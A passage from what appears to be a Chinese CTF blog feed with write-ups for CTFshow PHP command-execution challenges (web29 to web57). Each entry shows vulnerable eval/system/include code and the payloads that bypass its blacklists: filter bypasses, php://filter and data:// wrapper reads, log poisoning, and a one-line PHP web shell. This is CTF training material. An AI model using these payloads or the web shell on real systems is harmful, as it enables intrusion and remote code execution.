class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>本地运行文件，然后上传即可。<br>修改上传文件内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">cat flag.php</span><br></pre></td></tr></table></figure><p>注意途中要抓包，这样才更方便修改。<br>修改get传参<code>/?c=. /???/????????[@-[]</code>，我们可以先修改文件内容来ls一下查看文件：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679817166939-6c78d5c4-63c2-4473-9416-6b24f0bff2bc.png" alt="image.png"><br>cat访问文件。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679817244688-04f1315d-5f3a-4305-a1fc-68a7850e8dc0.png" alt="image.png"><br>注意，有的时候没有回显是因为文件末尾并不是大写字母，需要多尝试两遍。</p><h1 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同理，使用上一题第三种方法上传文件即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680162642108-4d1c4acd-baaa-40e9-9e8d-669a726c41d8.png" alt="image.png"></p><h1 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h1><blockquote><p><a href="https://blog.csdn.net/qq_46091464/article/details/108563368">https://blog.csdn.net/qq_46091464/article/details/108563368</a><br><a href="https://blog.csdn.net/weixin_45551083/article/details/110096787">https://blog.csdn.net/weixin_45551083/article/details/110096787</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跑一下剩余字符：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680166455656-158b002d-4a51-46d1-a26e-4f05df0a938a.png" alt="image.png"><br>题目的意思就是让我们使用剩余的这些字符凑出一个36出来。我们先看一下payload是什么：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure><p>我们在linux中尝试一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680166804307-4e25e785-2fda-487e-9e77-1a53dc2711aa.png" alt="image.png"><br>为什么会这样呢？我们分析一下，我们先要知道这其中的几个基础结构：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;_&#125;:代表上一次命令执行的结果</span><br><span class="line">$(()): 做运算</span><br></pre></td></tr></table></figure><p>知道了基础，然后我们结合数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(($&#123;_&#125;))=<span class="number">0</span></span><br><span class="line">$((~$(($&#123;_&#125;))))=-<span class="number">1</span></span><br></pre></td></tr></table></figure><p>然后直接使用脚本跑就行，需要36，那么就传入37然后再减一就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="string">&quot;$((~$((&quot;</span>+<span class="string">&quot;$((~$(())))&quot;</span>*<span class="number">37</span>+<span class="string">&quot;))))&quot;</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web29-41命令执行篇（一）</title>
      <link href="/2023/03/15/web29-41%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2023/03/15/web29-41%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很简单的一道题。<code>?c=system(&quot;ls&quot;);</code>查看一下发现flag.php就在当前目录下，因为过滤了flag字节，所以直接用f*代替就行<br>payload：<code>?c=system(&quot;cat f*&quot;);</code><br>flag在源代码中。</p><h2 id="其他解法"><a href="#其他解法" class="headerlink" title="其他解法"></a>其他解法</h2><ul><li>除此之外，我们可以将文件复制一份修改为其他名字。</li></ul><p>payload：<code>?c=system(&quot;cp f* a.txt&quot;);</code><br>然后直接访问或者cat访问都可以获得flag。</p><ul><li><p>或者使用<code>tac</code>从后往前输出内容<br><code>c=system(&quot;tac f*&quot;);</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678683262006-674f9d23-a923-4232-b54e-03a16b60eacc.png" alt="image.png"></p></li><li><p>除了使用system函数执行，也可以使用内敛执行：<code>echo </code>命令<code> 比如`c=echo `tac f*</code></p></li><li><p>看了wp发现还有几种解法比如：利用参数输入+eval/include</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls%20/&quot;</span>);</span><br><span class="line"></span><br><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure></li><li><p>或者上传木马：<code>file_put_contents(&quot;alb34t.php&quot;,%20%27&lt;?php%20eval($_POST[&quot;cmd&quot;]);%20?&gt;%27);</code></p></li><li><p>hint中使用了另一种命令和绕过：<code>nl fl&#39;&#39;ag.php</code></p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>cat打开后php文件不会显示在页面上，因此需要f12查看源代码。</p></li></ul><h1 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>upload：<code>?c=echo </code>tac f*<code>;</code></p><h1 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>空格过滤常用以下方法绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$<span class="number">9</span>flag.txt <span class="comment">//9改成其他数字也行</span></span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat%<span class="number">09</span>flag.txt</span><br><span class="line">cat%<span class="number">20</span>flag.txt <span class="comment">//这个这里好像不行</span></span><br></pre></td></tr></table></figure><p>payload：<code>?c=echo%09</code>tac%09f*<code>;</code></p><h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>upload：<code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678685067177-79d4d744-a673-436a-ac56-1be9a06a0803.png" alt="image.png"></p><h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><blockquote><p><a href="https://ctf.show/writeups/865962">https://ctf.show/writeups/865962</a></p></blockquote><p>初次之外，wp中还有一种在log中注入木马的方式。在User-Agent<br>中写入木马<code>&lt;?php phpinfo();?&gt;</code>，在c中传入能正常访问的值，我们根据请求头可以判断出是nginx服务器，服务器的默认日志地址为：<code>/var/log/nginx/access.log </code>，再加上这里的include的字段，我们可以得到以下payload：<code>?c=include$_GET[a]?%3E&amp;a=../../../../var/log/nginx/access.log</code>，日志页面中出现phpinfo()页面，插入木马成功。</p><h1 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>upload：<code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h1 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>upload：<code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h1 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>upload：<code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h1 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了数字，把1改为a就能接着用。<br>upload：<code>?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h1 id="web37-data伪协议文件名base64"><a href="#web37-data伪协议文件名base64" class="headerlink" title="web37 data伪协议文件名base64"></a>web37 data伪协议文件名base64</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这回直接给你include，文件包含，不让出现flag字段，上来先想到data伪协议。<br>upload：<code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs+</code><br>其中<code>PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs+</code>是：<code>&lt;?php system(&quot;tac flag.php&quot;);&gt;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678719387328-7c2f4056-1b4c-4999-9290-945a41c4ce13.png" alt="image.png"></p><h2 id="复习一下data伪协议的用法："><a href="#复习一下data伪协议的用法：" class="headerlink" title="复习一下data伪协议的用法："></a>复习一下data伪协议的用法：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、data:<span class="comment">//text/plain,</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="number">2</span>、data:<span class="comment">//text/plain;base64,</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span></span><br></pre></td></tr></table></figure><h1 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续使用上一题upload即可：<code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs+</code></p><h1 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>upload：<code>?c=data://text/plain,&lt;?php system(&quot;tac f*&quot;);?&gt;//</code><br>题目在include后面强加了<code>.php</code>我们只需要在语句中添加<code>//</code>注释掉末尾的字段即可。<br>但事实上，这道题不用管也可以，去掉<code>//</code>也是没问题的：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678720477364-6e7e2ec6-9a53-45d0-9550-05fa59a7a617.png" alt="image.png"></p><h1 id="web40-禁止套娃（有·东西）"><a href="#web40-禁止套娃（有·东西）" class="headerlink" title="web40 禁止套娃（有·东西）"></a>web40 禁止套娃（有·东西）</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span 